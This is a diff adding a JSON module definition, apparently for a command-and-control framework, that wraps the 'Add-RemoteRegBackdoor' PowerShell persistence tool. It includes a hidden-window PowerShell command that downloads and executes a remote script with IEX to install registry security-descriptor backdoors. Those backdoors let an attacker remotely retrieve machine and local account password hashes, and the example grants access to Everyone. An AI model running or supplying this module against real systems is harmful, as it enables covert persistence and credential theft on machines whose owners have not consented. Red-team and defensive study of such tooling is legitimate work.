@@ -1,0 +1,36 @@
+{
+  "base": {
+    "name": "Add-RemoteRegBackdoor",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Matt Nelson (@enigma0x3)", "Lee Christensen (@tifkin_)", "Will Schroeder (@harmj0y)"],
+    "path": ["windows", "x64", "powershell", "persistence", "Add-RemoteRegBackdoor.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powershell",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/HarmJ0y/DAMP/master/Add-RemoteRegBackdoor.ps1",
+    "local": ["data", "src", "HarmJ0y", "DAMP", "Add-RemoteRegBackdoor.ps1"],
+    "options": [
+      {"name": "ComputerName", "value": null, "required": false, "flag": "-ComputerName", "description":"Specifies the hostname to add the backdoor trustee to. Defaults to the localhost."},
+      {"name": "Trustee", "value": null, "required": false, "flag": "-Trustee", "description":"Specifies the name ('DOMAIN\\user') or the SID (S-1-...) of the trustee to add the backdoor for. Defaults to the current user."},
+      {"name": "Credential", "value": null, "required": false, "flag": "-Credential", "description":"A [Management.Automation.PSCredential] object of alternate credentials for connection to the remote system."},
+      {"name": "Verbose", "value": null, "required": false, "flag": "-Verbose", "description":"Enable verbose output"}
+    ],
+    "description": "Implements a new remote registry backdoor that allows for the remote retrieval of a system's machine account hash.",
+    "notes": "on some systems the LSA subkeys don't inherit permissions from their parent container, so we have to set those explicitly :( Combined, these malicious ACEs allow for the remote retrieval the system's computer account hash as well as local account hashes. These hashes can be retrieved with Get-RemoteMachineAccountHash and Get-RemoteLocalAccountHash, respectively.\r\n\r\nExample: PS C:\\Temp> Add-RemoteRegBackdoor -ComputerName client.external.local -Trustee 'S-1-1-0' -Verbose\r\nBlog: http://www.harmj0y.net/blog/activedirectory/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/\r\nPresentation: https://www.slideshare.net/harmj0y/an-ace-in-the-hole-stealthy-host-persistence-via-security-descriptors\r\nPresentation: https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w", "0",
+      "\"IEX",
+      "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HarmJ0y/DAMP/master/Add-RemoteRegBackdoor.ps1');",
+      "Add-RemoteRegBackdoor",
+      "{{ComputerName}}",
+      "{{Trustee}}",
+      "{{Credential}}",
+      "{{Verbose.Flag}}",
+      "\""
+    ]
+  }
+}
